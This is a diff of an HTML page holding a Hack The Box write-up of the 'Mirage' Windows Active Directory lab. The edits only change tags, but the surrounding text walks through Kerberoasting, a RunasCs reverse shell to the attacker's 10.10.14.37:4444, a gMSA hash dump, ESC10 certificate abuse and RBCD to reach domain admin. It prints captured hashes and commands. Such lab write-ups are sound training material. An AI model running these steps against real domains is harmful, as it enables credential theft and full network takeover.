@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Mirage is a Hard difficulty Windows AD machine. The attack begins by mounting an <strong>NFS share</strong> containing internal PDF reports that reveal a DNS misconfiguration and a service account. By exploiting the <strong>NATS messaging system</strong> (port 4222) via DNS record manipulation, credentials are intercepted. The escalation involves a <strong>Targeted Kerberoast</strong>, registry-stored <strong>autologon credentials</strong>, a <strong>gMSA password dump</strong>, and culminates in an <strong>ESC10 AD CS certificate attack</strong> chained with <strong>Resource-Based Constrained Delegation (RBCD)</strong> to achieve domain admin.</p>
+      <p>Mirage is a Hard difficulty Windows AD machine. The attack begins by mounting an <code>NFS share</code> containing internal PDF reports that reveal a DNS misconfiguration and a service account. By exploiting the <code>NATS messaging system</code> (port 4222) via DNS record manipulation, credentials are intercepted. The escalation involves a <code>Targeted Kerberoast</code>, registry-stored <code>autologon credentials</code>, a <code>gMSA password dump</code>, and culminates in an <code>ESC10 AD CS certificate attack</code> chained with <code>Resource-Based Constrained Delegation (RBCD)</code> to achieve domain admin.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
@@ -208,7 +208,7 @@ Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening
 
 ┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
 └─$ sudo chown $USER:$USER /tmp/Incident_Report_Missing_DNS_Record_nats-svc.pdf</code></pre></div>
-      <p>The <strong>Incident Report</strong> PDF reveals a DNS record misconfiguration for the NATS messaging service, and mentions a user named <code>Dev_Account_A</code>.</p>
+      <p>The <code>Incident Report</code> PDF reveals a DNS record misconfiguration for the NATS messaging service, and mentions a user named <code>Dev_Account_A</code>.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095049.png" alt="Incident report revealing NATS DNS misconfiguration" loading="lazy" /><span class="img-caption">Incident report revealing NATS DNS misconfiguration</span></div>
       <h2 class="writeup-section-title">Foothold: NATS Messaging Interception</h2>
       <h3 class="writeup-sub-title">DNS Manipulation & Credential Capture</h3>
@@ -272,7 +272,7 @@ INFO: Compressing output into 20250723063426_bloodhound.zip</code></pre></div>
 [*] Fetching usernames from Active Directory with LDAP
 [+] Printing hash for (nathan.aadam)
 $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$6c7aaf66537626958d39c1384c6745f8$5edf87f75c9bfbf1e480e1409c1b6d909a409f04774ffddd6b6d8d814a4da0b2071a62cfbd9ec89d4a725921529295cabfd3d46eff00bbb7b213c1c64959726fd631df5641e1bcaf0ebd9e405377ebb79af26be3f2dec08a363995f87070376d7436eea02585c1279405fdb21fa3bc43449d94a1a313aed659c1cc11b47a95119c6b1df5de82f2459b48bd0ceeea1964a80ed8b51c0e9fa6830abd4f8c748020e7ba1c09f7d17ef510cfe5e4c6e43c2cf110e00b34c8f2664aae8e5a72322ae962f506a2a4ff8073918af9a8930df79ab84a0eafbe1b9264985e6faffbc2a06c571ddbfb93d50eb6cdc373741430b9f45b948e776054b0d8fe43e417df98b9dfb73622d0bbe102a975579d01a307143b756f831a0113efa91953044137a5a3e45d9d627427076bfbcc5b2aee453c8d503fd072f938b6b45f55b1f339efcc271b666ba3cfc3cdfb95083e2e986d0781866172eb05d055bf4f3a89cdd902cf394fc6273e281678bd521a16f85df8bc131050d79e8e99a13cc026a7eaf214b7c4f7990c8b5f21bda424383ea6ce68d9afbc137ed6fb5062dffe96aabf5303e56cf62f6e93b8ad378860c8842216fe2252060c462e2b4d8a9b2d9516e7c450844740c29b5f0d7a0b8ee0f818849a474fa19bd61cd8794a9bfc31b31f11b8a80e51a47a7d37ebfe0b3ae9f3f59d9272a3efcee3c8601b8baeedab88d3efda1e3118ff68ebcc96d2d97f862737a5f00016685239f0da9ae6bd76d17627228cfef3254bf21e7304db16f9f674a610c2253704ce1589b316db6de69cd47ed4a545adcab916628b824abd071bf53e2c1426ee8d84905d8eaded393935c2994270107c972241bb6722b9f85c824c4dbfb90402ed94c18f3219cb3f23913be0144fd782044b397c658a347b8edea0c8d80a2cd29538a6f48d3cf1686436989506e06f4ca491935b23d905fdd3ab99a82f859f71dfa7059dc0e2c294ccedc154e9f3ec8ae5104d10defb80693f45e527a35bd7b4dba704304a2f54bdbe0c9b5f682e318c4acc503963eba9805fc6da3ca155ae4d9e37d829a78689cb9ae4480fb0b578a6923eb519c5bdd8debc7de89d377153c0e9a5978c6cbbe0a713ee580ee19bd0e120a8ca7f748e8d5e627ec60ca211f2a86a3092d54a4132433e17fcf860a089fce9b570a3943b166f4ad2a66fc6c2a009dd5646aacfb88b54a0eb8a717ac23b60d22ac8d4da7a59f8cd05c56c560bd7b3341a5d6142c486287a2c8b05f1acb9432f88f64b52ac9267e346dd0da34e368b80efe469eb555060d158acfdfa3960072da3e81d83897709e9789a980ec5790f0f6411fa2b462aa7f996149b7bdddc4e623a82db190cb05bf3456d0af14efd1a3133cefeae79ff6ff0614ce5f48fdb8f91bd0c5678782f9a15c2617f98b67cecd1ca77ff851dbbef7273e4236509807caa0298133e8c404ccce14bf70906141397dcc21a6f08cf797675b719290bbbe9f319dddf59b9d32b250ae10fee8b0b30244992430584800792049301f59ef827180b7c4f803d1e442aa91694f3766073478642aeae9e02c564cf13</code></pre></div>
-      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
+      <p>I crack the extracted hash using <code>John the Ripper</code> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ sudo nano hash                                                       
 
@@ -298,7 +298,7 @@ Session completed.</code></pre></div>
 └─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop&gt; ls
 
 
@@ -335,9 +335,9 @@ mark.bbond      MIRAGE            1day@atime      1</code></pre></div>
 Info: Uploading /home/kali/HTB/Mirage/RunasCs/RunasCs.cs to C:\Users\nathan.aadam\Documents\RunasCs.cs
 
 Info: Upload successful!</code></pre></div>
-      <p>I use <strong>RunasCs</strong> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
+      <p>I use <code>RunasCs</code> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
       <div class="code-block"><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>Windows connection
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; .\RunasCs_net2.exe mark.bbond 1day@atime Powershell.exe -r 10.10.14.37:4444
@@ -378,9 +378,9 @@ Local Group Memberships</code></pre></div>
       <p>I modify the target Active Directory user object using PowerShell's <code>Set-ADUser</code> cmdlet. This may involve enabling a disabled account (<code>-Enabled $true</code>), clearing logon hour restrictions, or modifying other attributes that prevent the account from authenticating. Disabled or restricted accounts in AD are often overlooked during security hardening, but once re-enabled by an attacker with sufficient rights, they provide fresh attack vectors.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; Set-ADUser -Identity &quot;javier.mmarshall&quot; -Replace @{logonHours=([byte[]](0xFF)*21)}</code></pre></div>
       <h3 class="writeup-sub-title">gMSA Password Dump</h3>
-      <p>After modifying the account, I retrieve the <strong>gMSA password</strong> for the Mirage-Service account and convert it to an NT hash.</p>
+      <p>After modifying the account, I retrieve the <code>gMSA password</code> for the Mirage-Service account and convert it to an NT hash.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250725101334.png" alt="gMSA hash extraction path" loading="lazy" /><span class="img-caption">gMSA hash extraction path</span></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/gMSADumper]
 └─$ bloodyAD -k --host &#x27;10.129.6.26&#x27; -d &#x27;mirage.htb&#x27; -u &#x27;javier.mmarshall&#x27; -p &#x27;Newpassword123&#x27; --host dc01.mirage.htb get object &#x27;Mirage-Service$&#x27; --attr msDS-ManagedPassword  
 
@@ -388,7 +388,7 @@ distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=ht
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
 msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==</code></pre></div>
       <h3 class="writeup-sub-title">ESC10 — Weak Certificate Mapping</h3>
-      <p><strong>ESC10</strong> exploits weak certificate mapping for Schannel authentication. By requesting a TGT for the gMSA account, changing the UPN to Administrator, requesting a certificate, and then authenticating with it, I can impersonate the domain admin.</p>
+      <p><code>ESC10</code> exploits weak certificate mapping for Schannel authentication. By requesting a TGT for the gMSA account, changing the UPN to Administrator, requesting a certificate, and then authenticating with it, I can impersonate the domain admin.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ impacket-getTGT -dc-ip 10.129.6.26 mirage.htb/&#x27;Mirage-Service$&#x27; -hashes &#x27;:305806d84f7c1be93a07aaf40f0c7866&#x27; -k
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
@@ -414,7 +414,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
       <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ export KRB5CCNAME=mark.bbond.ccache</code></pre></div>
-      <p>I use <strong>certipy req</strong> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <strong>ESC-type certificate abuse</strong> attacks.</p>
+      <p>I use <code>certipy req</code> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <code>ESC-type certificate abuse</code> attacks.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip 10.129.6.26 -dc-host dc01.mirage.htb
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -447,7 +447,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
     userPrincipalName                   : mark.bbond@mirage.htb
 [*] Successfully updated &#x27;mark.bbond&#x27;</code></pre></div>
       <h3 class="writeup-sub-title">RBCD & Domain Admin</h3>
-      <p>Using the forged certificate, I connect to LDAP via Schannel and set up <strong>Resource-Based Constrained Delegation (RBCD)</strong>. RBCD allows a machine account to impersonate any user to a target service. I configure it so the IT-Computer can impersonate the backupadmin on the DC.</p>
+      <p>Using the forged certificate, I connect to LDAP via Schannel and set up <code>Resource-Based Constrained Delegation (RBCD)</code>. RBCD allows a machine account to impersonate any user to a target service. I configure it so the IT-Computer can impersonate the backupadmin on the DC.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.6.26 -ldap-shell
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -461,7 +461,7 @@ Type help for list of commands
 
 # whoami
 u:MIRAGE\DC01$</code></pre></div>
-      <p>I configure <strong>Resource-Based Constrained Delegation (RBCD)</strong> on the target computer object. This allows the specified machine account to impersonate any user when authenticating to the DC.</p>
+      <p>I configure <code>Resource-Based Constrained Delegation (RBCD)</code> on the target computer object. This allows the specified machine account to impersonate any user when authenticating to the DC.</p>
       <div class="code-block"><pre><code># set_rbcd dc01$ Mirage-Service$
 Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
 Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
@@ -516,7 +516,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ evil-winrm -i dc01.mirage.htb -r mirage.htb</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
